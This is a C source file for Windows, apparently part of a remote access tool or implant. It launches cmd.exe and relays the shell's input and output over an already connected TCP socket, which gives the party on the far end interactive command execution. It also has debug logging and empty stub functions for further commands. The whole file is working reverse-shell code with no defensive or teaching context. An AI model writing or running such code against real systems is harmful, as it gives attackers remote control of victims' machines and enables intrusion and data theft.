#include "includes.h"


struct shell_arg{
    SOCKET sockfd;
    PROCESS_INFORMATION pi;
    HANDLE hChildStdInWrite;
};

// Thread function to forward data from socket to the child process
void forwardToChildProcess(void* param) {
    struct shell_arg* sa = (struct shell_arg*)param;
    SOCKET sockfd = sa->sockfd;
    HANDLE hChildStdInWrite = sa->hChildStdInWrite;
    PROCESS_INFORMATION pi = sa->pi;
    char buffer[1024];
    int bytesRead;
    while ((bytesRead = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
        // Write the received data to the child process
        DWORD bytesWritten;
        WriteFile(hChildStdInWrite, buffer, bytesRead, &bytesWritten, NULL);
    }

    // Handle the case when the socket is closed
    if (bytesRead == 0) {
        printf("Socket closed.\n");
        // Optionally, you can terminate the process here or take appropriate action.
        // For simplicity, we'll just exit the program.
        if (pi.hProcess != NULL){
            DBGLG("Killing cmd\n");
            TerminateProcess(pi.hProcess, 9);
        }
        exit(0);
    } else {
        perror("recv failed");
    }
}



int Shell(PROCESS_INFORMATION* pi, SOCKET sockfd) {
    // Assume the SOCKET 'sockfd' is already connected via TCP

    // Create pipes for communicating with the child process
    HANDLE hChildStdInRead, hChildStdInWrite, hChildStdOutRead, hChildStdOutWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    // Create pipes for child process standard input and output
    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);

    // Create child process
    STARTUPINFO siStartInfo;
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    // siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdInput = hChildStdInRead;
    siStartInfo.hStdOutput = hChildStdOutWrite;
    siStartInfo.hStdError = hChildStdOutWrite;
    siStartInfo.dwFlags = STARTF_USESTDHANDLES;

    // Replace "YOUR_CLI_APP.exe" with the path to your external CLI application
    if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, pi)) {
        DBGLG("Create process failed: ", GetLastError());
        exit(EXIT_FAILURE);
    }

    // Close unused ends of the pipes
    CloseHandle(hChildStdInRead);
    CloseHandle(hChildStdOutWrite);
    struct shell_arg sa = {sockfd, *pi, hChildStdInWrite};
    // Create a thread to read from the TCP socket and forward to the child process
    _beginthread(forwardToChildProcess, 0, (void*)&sa);

    // Continuously read from the child process and forward to the TCP socket
    char buffer[1024];
    DWORD bytesRead, bytesWritten;

    while (1) {
        if (!ReadFile(hChildStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            break;
        }

        // Send the received output to the server through the TCP socket
        send(sockfd, buffer, bytesRead, 0);
    }

    // Wait for the child process to exit
    WaitForSingleObject(pi->hProcess, INFINITE);

    // Close handles and clean up
    CloseHandle(hChildStdInWrite);
    CloseHandle(hChildStdOutRead);
    CloseHandle(pi->hProcess);
    CloseHandle(pi->hThread);

    return 0;
}

int Cout(SOCKET sockt, ...)
{
    return -1;
}

int File(SOCKET sockt, ...)
{
    return -1;
}